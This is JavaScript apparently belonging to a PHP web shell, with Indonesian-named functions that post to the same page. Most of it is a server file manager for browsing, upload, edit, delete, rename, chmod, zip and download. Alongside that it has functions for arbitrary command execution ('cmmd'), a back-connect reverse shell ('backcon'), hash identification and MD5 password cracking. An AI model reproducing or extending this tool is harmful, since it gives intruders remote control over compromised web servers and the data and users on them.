// Saat tombol folder diklik
    $('#file-man').on('click', '#folder, #separator', function() {
        
      var path = $(this).data('path');
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: 'simpan_path', path: path},
      });
      //console.log(path);
      loadFolder(path);
    });


    // Buka Folder dengan ajax
    function loadFolder(path) {
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: 'buka_folder', path: path},
        beforeSend: function() {
          $('#konten').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
          //console.log(data);
          $('#file-man').html(data);
          $('#link-dir').load(location.href + " #link-dir");
          window.history.replaceState({path: path}, '', '?d=' + path);
        }
      });
    }


function multiSelect() {
  var action = $('select[name="action"]').val();
  var checked = [];
  $('input[name="check[]"]:checked').each(function() {
    checked.push($(this).val());
  });
  if (action == 'delete') {
    $.each(checked, function(index, value) {
      hapus(value); // memanggil fungsi hapus untuk setiap file/folder yang dipilih
    });
  } else if (action == 'unzip') {
    $.each(checked, function(index, value) {
    unZip(value);// proses unzip
    });
  } else if (action == 'zip') {
    var nama_file = prompt("Enter zip name without .zip:");
    $.ajax({
      type: 'POST',
      url: '',
      data: 'aksi=makezip&nama_file=' + nama_file + '&check=' + checked.join(','),
      success: function(data) {
        $('#konten').html(data);
        reloadPage();
      }
    });
  }
};


function unZip(nama_file) {
    var data = 'aksi=unziip&nama_file=' + nama_file;
  $.ajax({
    type: 'POST',
    url: '',
    data: data,
    success: function(data) {
      $('#konten').html(data);
      reloadPage();
    }
  });
}



// Fungsi hapus file/folder
function hapus(nama_file) {
  if (typeof nama_file === 'array') {
    $.ajax({
      type: 'POST',
      url: '',
      data: 'aksi=hapus_file&nama_file=' + nama_file.join(','),
      success: function(data) {
        $('#konten').html(data);
        reloadPage();
      }
    });
  } else {
    $.ajax({
      type: 'POST',
      url: '',
      data: 'aksi=hapus_file&nama_file=' + nama_file,
      success: function(data) {
        $('#konten').html(data);
        reloadPage();
      }
    });
  }
}


      // Fungsi download
      function dl(nama_file) {
      window.location.href = '?dl=' + nama_file;
      }

     // Fungsi edit file
      function edit_file(nama_file) {
        //$('#form_edit').show();
        $.ajax({
          type: 'POST',
          url: '',
          data: 'aksi=edit_file&nama_file=' + nama_file,
          success: function(data) {
            $('#konten').html(data);
          }
        });
      }

      // Fungsi rename file
      function rename(nama_file) {
        //$('#form_edit').show();
        $.ajax({
          type: 'POST',
          url: '',
          data: 'aksi=rename&nama_file=' + nama_file,
          success: function(data) {
            $('#konten').html(data);
          }
        });
      }

      function doRename() {
      var formData = $('#form_rename_file').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=doRename',
        beforeSend: function() {
          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
          $('#simpan').html(data);
          reloadPage();
        }
      });
    }

    // Fungsi Chmod
    function cmod(nama_file) {
        //$('#form_edit').show();
        $.ajax({
          type: 'POST',
          url: '',
          data: 'aksi=cmod&nama_file=' + nama_file,
          success: function(data) {
            $('#konten').html(data);
          }
        });
      }

      function doCmod() {
      var formData = $('#form_cmod').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=doCmod',
        beforeSend: function() {
          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
          $('#simpan').html(data);
          reloadPage();
        }
      });
    }

    function kirimForm() {
      var formData = $('#form_edit_file').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData,
        beforeSend: function() {
          $('#simpan').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
        $('#simpan').html(data);
        //$('#form_edit').hide();
        //reloadPage();
        }
      });
    }

    $('#form_upload_file').submit(function(e) {
      e.preventDefault();
      var file = $('#file')[0].files[0];
      var formData = new FormData();
      formData.append('file', file);
      formData.append('aksi', 'upload_file');

      $.ajax({
        type: 'POST',
        url: '',
        data: formData,
        contentType: false,
        processData: false,
        beforeSend: function() {
          $('#status-upload').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
          $('#status-upload').html(data);
          reloadPage();

        }
      });
    });

    $('#form_buat_file').submit(function(e) {
        e.preventDefault();
        var formData = $(this).serialize();
          $.ajax({
            type: 'POST',
            url: '',
            data: formData + '&aksi=buat_file',
            beforeSend: function() {
              $('#status-nf').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
            },
            success: function(data) {
              $('#status-nf').html(data);
              reloadPage();
            }
          });
      });

    $('#form_buat_folder').submit(function(e) {
        e.preventDefault();
        var formData = $(this).serialize();
          $.ajax({
            type: 'POST',
            url: '',
            data: formData + '&aksi=buat_folder',
            beforeSend: function() {
              $('#status-nd').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
            },
            success: function(data) {
              $('#status-nd').html(data);
              reloadPage();
            }
          });
      });

    function kirimcmd() {
      var formData = $('#command').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=cmmd',
        beforeSend: function() {
          $('#cmd_output').html('Please wait...');
        },
        success: function(data) {
        $('#cmd_output').html(data);
        }
      });
    }

    function text2md5() {
      var formData = $('#passtext').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=text2md5_',
        beforeSend: function() {
          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
        $('#output').html(data);
        }
      });
    }

    function hashid() {
      var formData = $('#hashid').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=hash_id',
        beforeSend: function() {
          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
        $('#output').html(data);
        }
      });
    }

    function bc() {
      var formData = $('#bcon').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=backcon',
        beforeSend: function() {
          $('#output').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
        $('#output').html(data);
        }
      });
    }

    function deMD5() {
      var formData = $('#passlist, #md5pass').serialize();
      $.ajax({
        type: 'POST',
        url: '',
        data: formData + '&aksi=decmd5',
        beforeSend: function() {
          $('#cracked').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
        $('#cracked').html(data);
        }
      });
    }

    // Buka Menu dengan ajax
    function bukaMenu(menu) {
      $.ajax({
        type: 'POST',
        url: '',
        data: {aksi: menu},
        beforeSend: function() {
          $('#konten').html('<div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center"><div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status"><span class="sr-only">Loading...</span></div></div>');
        },
        success: function(data) {
          $('#file-man').html(data);
          $('#link-dir').load(location.href + " #link-dir");
          window.history.replaceState({menu: menu}, '', '?menu=' + menu);
        },
        error: function(xhr, status, error) {
          console.log('Error: ' + error);
        }

      });
    }

    function reloadPage(){
      setTimeout(function() {
              window.location.reload();
              }, 1000);
    }

    function stopEnterKey(evt) {
        var evt = (evt) ? evt : ((event) ? event : null);
        var node = (evt.target) ? evt.target : ((evt.srcElement) ? evt.srcElement : null);
        if ((evt.keyCode == 13) && (node.type == "text")) { return false; }
    }
    document.onkeypress = stopEnterKey;

(async ({chrome, netscape}) => {

  // add Safari polyfill if needed
  if (!chrome && !netscape)
    await import('https://unpkg.com/@ungap/custom-elements');

  const {default: HighlightedCode} =
    await import('https://unpkg.com/highlighted-code');

  // bootstrap a theme through one of these names
  // https://github.com/highlightjs/highlight.js/tree/main/src/styles
  HighlightedCode.useTheme('github-dark');
})(self);

function checkAll(isChecked) {
  if(isChecked) {
    $('input[name="check[]"]').each(function() { 
      this.checked = true; 
    });
  } else {
    $('input[name="check[]"]').each(function() {
      this.checked = false;
    });
  }
}